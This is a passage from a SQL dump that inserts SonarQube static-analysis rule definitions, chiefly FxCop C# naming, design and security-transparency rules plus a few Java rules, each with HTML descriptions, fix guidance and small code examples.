            Although return values are commonplace and heavily used, the correct application of <code>out</code> and <code>ref</code> parameters requires intermediate design and coding skills. Library architects who design for a general audience should not expect users to master working with <code>out</code> or <code>ref</code> parameters.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule that is caused by a value type, have the method return the object as its return value. If the method must return multiple values, redesign it to return a single instance of an object that holds the values.
            To fix a violation of this rule that is caused by a reference type, make sure that the desired behavior is to return a new instance of the reference. If it is, the method should use its return value to do this.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule. However, this design could cause usability issues.
</p>
<h2>Example</h2>

<h3>Description</h3>
<p>
                Methods that implement the Try&lt;Something&gt; pattern, such as Int32.TryParse, do not raise this violation. The following example shows a structure (value type) that implements the Int32.TryParse method.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    public struct Point
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int axisX, int axisY)
        {
            _X = axisX;
            _Y = axisY;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override int GetHashCode()
        {
            return _X ^ _Y;
        }

        public override bool Equals(object obj)
        {
            if (!(obj is Point))
                return false;

            return Equals((Point)obj);
        }

        public bool Equals(Point other)
        {
            if (_X != other._X)
                return false;

            return _Y == other._Y;
        }

        public static bool operator ==(Point point1, Point point2)
        {
            return point1.Equals(point2);
        }

        public static bool operator !=(Point point1, Point point2)
        {
            return !point1.Equals(point2);
        }

        // Does not violate this rule 
        public static bool TryParse(string value, out Point result)
        {
            // TryParse Implementation
            result = new Point(0,0);
            return false;
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DoNotPassTypesByReference}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182131.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182131.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812519, 1510817812519, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (576, 'CA1709: Identifiers should be cased correctly', 'IdentifiersShouldBeCasedCorrectly', 'CA1709', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an identifier is not cased correctly.
            - or -
            The name of an identifier contains a two-letter acronym and the second letter is lowercase.
            - or -
            The name of an identifier contains an acronym of three or more uppercase letters.
</p>
<h2>Rule Description</h2>
<p>
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
            By convention, parameter names use camel casing; namespace, type, and member names use Pascal casing. In a camel-cased name, the first letter is lowercase, and the first letter of any remaining words in the name is in uppercase. Examples of camel-cased names are "packetSniffer", "ioFile", and "fatalErrorCode". In a Pascal-cased name, the first letter is uppercase, and the first letter of any remaining words in the name is in uppercase. Examples of Pascal-cased names are "PacketSniffer", "IOFile", and "FatalErrorCode".
            This rule splits the name into words based on the casing and checks any two-letter words against a list of common two-letter words, such as "In" or "My". If a match is not found, the word is assumed to be an acronym. In addition, this rule assumes it has found an acronym when the name contains either four uppercase letters in a row or three uppercase letters in a row at the end of the name.
            By convention, two-letter acronyms use all uppercase letters, and acronyms of three or more characters use Pascal casing. The following examples use this naming convention: ''DB'', ''CR'', ''Cpa'', and ''Ecma''. The following examples violate the convention: ''Io'', ''XML'', and ''DoD'', and for nonparameter names, ''xp'' and ''cpl''.
            ''ID'' is special-cased to cause a violation of this rule. ''Id'' is not an acronym but is an abbreviation for ''identification''.
</p>
<h2>How to Fix Violations</h2>
<p>
            Change the name so that it is cased correctly.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress this warning if you have your own naming conventions, or if the identifier represents a proper name, for example, the name of a company or a technology.
            You can also add specific terms, abbreviations, and acronyms that to a code analysis custom dictionary. Terms specified in the custom dictionary will not cause violations of this rule. For more information, see How to: Customize the Code Analysis Dictionary
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182240.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182240.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812520, 1510817812521, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (577, 'CA1822: Mark members as static', 'MarkMembersAsStatic', 'CA1822', 'fxcop', '<h2>Cause</h2>
<p>
            A member that does not access instance data is not marked as static (Shared in Visual Basic).
</p>
<h2>Rule Description</h2>
<p>
            Members that do not access instance data or call instance methods can be marked as static (Shared in Visual Basic). After you mark the methods as static, the compiler will emit nonvirtual call sites to these members. Emitting nonvirtual call sites will prevent a check at runtime for each call that makes sure that the current object pointer is non-null. This can achieve a measurable performance gain for performance-sensitive code. In some cases, the failure to access the current object instance represents a correctness issue.
</p>
<h2>How to Fix Violations</h2>
<p>
            Mark the member as static (or Shared in Visual Basic) or use ''this''/''Me'' in the method body, if appropriate.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule for previously shipped code for which the fix would be a breaking change.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidUncalledPrivateCode}<br/>




                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>




                {rule:fxcop:RemoveUnusedLocals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms245046.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms245046.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812522, 1510817812522, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (578, 'CA2225: Operator overloads have named alternates', 'OperatorOverloadsHaveNamedAlternates', 'CA2225', 'fxcop', '<h2>Cause</h2>
<p>
            An operator overload was detected, and the expected named alternative method was not found.
</p>
<h2>Rule Description</h2>
<p>
            Operator overloading allows the use of symbols to represent computations for a type. For example, a type that overloads the plus symbol (+) for addition would typically have an alternative member named ''Add''. The named alternative member provides access to the same functionality as the operator, and is provided for developers who program in languages that do not support overloaded operators.
            This rule examines the operators listed in the following table.







                    C#


                    Visual Basic


                    C++


                    Alternate name




                    + (binary)


                    +


                    + (binary)


                    Add




                    +=


                    +=


                    +=


                    Add




                    &amp;


                    And


                    &amp;


                    BitwiseAnd




                    &amp;=


                    And=


                    &amp;=


                    BitwiseAnd




                    |


                    Or


                    |


                    BitwiseOr




                    |=


                    Or=


                    |=


                    BitwiseOr




                    --


                    N/A


                    --


                    Decrement




                    /


                    /


                    /


                    Divide




                    /=


                    /=


                    /=


                    Divide




                    ==


                    =


                    ==


                    Equals




                    ^


                    Xor


                    ^


                    Xor




                    ^=


                    Xor=


                    ^=


                    Xor




                    &gt;


                    &gt;


                    &gt;


                    Compare




                    &gt;=


                    &gt;=


                    &gt;=


                    Compare




                    ++


                    N/A


                    ++


                    Increment




                    !=


                    &lt;&gt;


                    !=


                    Equals




                    &lt;&lt;


                    &lt;&lt;


                    &lt;&lt;


                    LeftShift




                    &lt;&lt;=


                    &lt;&lt;=


                    &lt;&lt;=


                    LeftShift




                    &lt;


                    &lt;


                    &lt;


                    Compare




                    &lt;=


                    &lt;=


                    &lt;=


                    Compare




                    &amp;&amp;


                    N/A


                    &amp;&amp;


                    LogicalAnd




                    ||


                    N/A


                    ||


                    LogicalOr




                    !


                    N/A


                    !


                    LogicalNot




                    %


                    Mod


                    %


                    Mod or Remainder




                    %=


                    N/A


                    %=


                    Mod




                    * (binary)


                    *


                    *


                    Multiply




                    *=


                    N/A


                    *=


                    Multiply




                    ~


                    Not


                    ~


                    OnesComplement




                    &gt;&gt;


                    &gt;&gt;


                    &gt;&gt;


                    RightShift




                    &gt;&gt;=


                    N/A


                    &gt;&gt;=


                    RightShift




                    - (binary)


                    - (binary)


                    - (binary)


                    Subtract




                    -=


                    N/A


                    -=


                    Subtract




                    true


                    IsTrue


                    N/A


                    IsTrue (Property)




                    - (unary)


                    N/A


                    -


                    Negate




                    + (unary)


                    N/A


                    +


                    Plus




                    false


                    IsFalse


                    False


                    IsTrue (Property)




            N/A == Cannot be overloaded in the selected language.
            The rule also checks implicit and explicit cast operators in a type (SomeType) by checking for methods named ToSomeType and FromSomeType.
            In C#, when a binary operator is overloaded, the corresponding assignment operator, if any, is also implicitly overloaded.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement the alternative method for the operator; name it using the recommended alternative name.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule if you are implementing a shared library. Applications can ignore a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>




                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>




                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>




                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}<br/>




                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182355.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182355.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812523, 1510817812524, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (700, 'Methods should not have identical implementations', 'S4144', NULL, 'squid', '<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private final static String CODE = "bounteous";

public String calculateCode() {
  doTheThing();
  return CODE;
}

public String getName() {  // Noncompliant
  doTheThing();
  return CODE;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private final static String CODE = "bounteous";

public String getCode() {
  doTheThing();
  return CODE;
}

public String getName() {
  return getCode();
}
</pre>
<h2>Exceptions</h2>
<p>Methods that are not accessors (getters and setters), with fewer than 2 statements are ignored.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'confusing,duplicate,suspicious', false, 'HTML', 1510817812687, 1510817812688, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (579, 'CA1724: Type Names Should Not Match Namespaces', 'TypeNamesShouldNotMatchNamespaces', 'CA1724', 'fxcop', '<h2>Cause</h2>
<p>
            A type name matches a .NET Framework namespace names in a case-insensitive comparison.
</p>
<h2>Rule Description</h2>
<p>
            Type names should not match the names of namespaces that are defined in the .NET Framework class library. Violating this rule can reduce the usability of the library.
</p>
<h2>How to Fix Violations</h2>
<p>
            Select a type name that does not match the name of a .NET Framework class library namespace.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            For new development, no known scenarios occur where you must suppress a warning from this rule. Before you suppress the warning, carefully consider how the users of your library might be confused by the matching name. For shipping libraries, you might have to suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182257.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182257.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812525, 1510817812525, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (580, 'CA1722: Identifiers should not have incorrect prefix', 'IdentifiersShouldNotHaveIncorrectPrefix', 'CA1722', 'fxcop', '<h2>Cause</h2>
<p>
            An identifier has an incorrect prefix.
</p>
<h2>Rule Description</h2>
<p>
            By convention, only certain programming elements have names that begin with a specific prefix.
            Type names do not have a specific prefix and should not be prefixed with a ''C''. This rule reports violations for type names such as ''CMyClass'' and does not report violations for type names such as ''Cache''.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Remove the prefix from the identifier.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldHaveCorrectPrefix}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182246.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182246.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812526, 1510817812526, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (581, 'CA2135: Level 2 assemblies should not contain LinkDemands', 'SecurityRuleSetLevel2MethodsShouldNotBeProtectedWithLinkDemands', 'CA2135', 'fxcop', '<h2>Cause</h2>
<p>
            A class or class member is using a <code>LinkDemand</code> in an application that is using Level 2 security.
</p>
<h2>Rule Description</h2>
<p>
            LinkDemands are deprecated in the level 2 security rule set. Instead of using LinkDemands to enforce security at just-in-time (JIT) compilation time, mark the methods, types, and fields with the <code>SecurityCriticalAttribute</code> attribute.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the <code>LinkDemand</code> and mark the type or member with the <code>SecurityCriticalAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997569.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997569.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812527, 1510817812528, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (582, 'CA2139: Transparent methods may not use the HandleProcessCorruptingExceptions attribute', 'TransparentMethodsMustNotHandleProcessCorruptingExceptions', 'CA2139', 'fxcop', '<h2>Cause</h2>
<p>
            A transparent method is marked with the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>
            This rule fires any method which is transparent and attempts to handle a process corrupting exception by using the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute. A process corrupting exception is a CLR version 4.0 exception classification of exceptions such <code>AccessViolationException</code>. The HandleProcessCorruptedStateExceptionsAttribute attribute may only be used by security critical methods, and will be ignored if it is applied to a transparent method. To handle process corrupting exceptions, this method must become security critical or security safe-critical.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the <code>HandleProcessCorruptedStateExceptionsAttribute</code> attribute, or mark the method with the <code>SecurityCriticalAttribute</code> or the <code>SecuritySafeCriticalAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997565.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997565.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812528, 1510817812529, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (583, 'CA2130: Security critical constants should be transparent', 'ConstantsShouldBeTransparent', 'CA2130', 'fxcop', '<h2>Cause</h2>
<p>
            A constant field or an enumeration member is marked with the <code>SecurityCriticalAttribute</code>.
</p>
<h2>Rule Description</h2>
<p>
            Transparency enforcement is not enforced for constant values because compilers inline constant values so that no lookup is required at run time. Constant fields should be security transparent so that code reviewers do not assume that transparent code cannot access the constant.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the SecurityCritical attribute from the field or value.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997446.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997446.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812529, 1510817812530, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (705, 'Assignments should not be redundant', 'S4165', NULL, 'squid', '<p>The transitive property says that if <code>a == b</code> and <code>b == c</code>, then <code>a == c</code>. In such cases, there''s no point in
assigning <code>a</code> to <code>c</code> or vice versa because they''re already equivalent. </p>
<p>This rule raises an issue when an assignment is useless because the assigned-to variable already holds the value on all execution paths.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = b;
c = a;
b = c; // Noncompliant: c and b are already the same
</pre>
<h2>Compliant Solution</h2>
<pre>
a = b;
c = a;
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'redundant', false, 'HTML', 1510817812696, 1510817812696, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (706, '"throws" declarations should not be superfluous', 'RedundantThrowsDeclarationCheck', 'S1130', 'squid', '<p>An exception in a <code>throws</code> declaration in Java is superfluous if it is:</p>
<ul>
  <li> listed multiple times </li>
  <li> a subclass of another listed exception </li>
  <li> a <code>RuntimeException</code>, or one of its descendants </li>
  <li> completely unnecessary because the declared exception type cannot actually be thrown </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() throws MyException, MyException {}  // Noncompliant; should be listed once
void bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable
void baz() throws RuntimeException {}  // Noncompliant; RuntimeException can always be thrown
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() throws MyException {}
void bar() throws Throwable {}
void baz() {}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy,redundant,unused', false, 'HTML', 1510817812697, 1510817812697, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (707, 'The diamond operator ("<>") should be used', 'S2293', NULL, 'squid', '<p>Java 7 introduced the diamond operator (<code>&lt;&gt;</code>) to reduce the verbosity of generics code. For instance, instead of having to declare
a <code>List</code>''s type in both its declaration and its constructor, you can now simplify the constructor declaration with <code>&lt;&gt;</code>,
and the compiler will infer the type.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; strings = new ArrayList&lt;String&gt;();  // Noncompliant
Map&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;String,List&lt;Integer&gt;&gt;();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; strings = new ArrayList&lt;&gt;();
Map&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;&gt;();
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812698, 1510817812698, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (584, 'CA1802: Use Literals Where Appropriate', 'UseLiteralsWhereAppropriate', 'CA1802', 'fxcop', '<h2>Cause</h2>
<p>
            A field is declared <code>static</code> and <code>readonly</code> (<code>Shared</code> and <code>ReadOnly</code> in Visual Basic), and is initialized with a value that is computable at compile time.
</p>
<h2>Rule Description</h2>
<p>
            The value of a <code>static</code> <code>readonly</code> field is computed at runtime when the static constructor for the declaring type is called. If the <code>static</code> <code>readonly</code> field is initialized when it is declared and a static constructor is not declared explicitly, the compiler emits a static constructor to initialize the field.
            The value of a <code>const</code> field is computed at compile time and stored in the metadata, which increases runtime performance when it is compared to a <code>static</code> <code>readonly</code> field.
            Because the value assigned to the targeted field is computable at compile time, change the declaration to a <code>const</code> field so that the value is computed at compile time instead of at runtime.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, replace the <code>static</code> and <code>readonly</code> modifiers with the <code>const</code> modifier.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule, or disable the rule, if performance is not of concern.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182280.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182280.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812530, 1510817812531, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (585, 'CA1411: COM registration methods should not be visible', 'ComRegistrationMethodsShouldNotBeVisible', 'CA1411', 'fxcop', '<h2>Cause</h2>
<p>
            A method that is marked with the <code>System.Runtime.InteropServices.ComRegisterFunctionAttribute</code> or the <code>System.Runtime.InteropServices.ComUnregisterFunctionAttribute</code> attribute is externally visible.
</p>
<h2>Rule Description</h2>
<p>
            When an assembly is registered with Component Object Model (COM), entries are added to the registry for each COM-visible type in the assembly. Methods that are marked with the <code>ComRegisterFunctionAttribute</code> and <code>ComUnregisterFunctionAttribute</code> attributes are called during the registration and unregistration processes, respectively, to run user code that is specific to the registration/unregistration of these types. This code should not be called outside these processes.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the accessibility of the method to <code>private</code> or <code>internal</code> (<code>Friend</code> in Visual Basic).
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:ComRegistrationMethodsShouldBeMatched}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182201.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182201.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812532, 1510817812532, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (586, 'CA1708: Identifiers should differ by more than case', 'IdentifiersShouldDifferByMoreThanCase', 'CA1708', 'fxcop', '<h2>Cause</h2>
<p>
            The names of two types, members, parameters, or fully qualified namespaces are identical when they are converted to lowercase.
</p>
<h2>Rule Description</h2>
<p>
            Identifiers for namespaces, types, members, and parameters cannot differ only by case because languages that target the common language runtime are not required to be case-sensitive. For example, Visual Basic is a widely used case-insensitive language.
            This rule fires on publicly visible members only.
</p>
<h2>How to Fix Violations</h2>
<p>
            Select a name that is unique when it is compared to other identifiers in a case-insensitive manner.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. The library might not be usable in all available languages in the .NET Framework.
</p>
<h2>Example of a Violation</h2>
<p>
            The following example demonstrates a violation of this rule.










            <pre>
using System;
namespace NamingLibrary
{
    public class Class1	// IdentifiersShouldDifferByMoreThanCase
    {
        protected string someProperty;

        public string SomeProperty
        {
            get { return someProperty; }
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182242.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182242.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812533, 1510817812533, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (587, 'CA1501: Avoid excessive inheritance', 'AvoidExcessiveInheritance', 'CA1501', 'fxcop', '<h2>Cause</h2>
<p>
            A type is more than four levels deep in its inheritance hierarchy.
</p>
<h2>Rule Description</h2>
<p>
            Deeply nested type hierarchies can be difficult to follow, understand, and maintain. This rule limits analysis to hierarchies in the same module.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, derive the type from a base type that is less deep in the inheritance hierarchy or eliminate some of the intermediate base types.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule. However, the code might be more difficult to maintain. Note that, depending on the visibility of base types, resolving violations of this rule might create breaking changes. For example, removing public base types is a breaking change.
</p><h2>MSDN Documentation</h2>
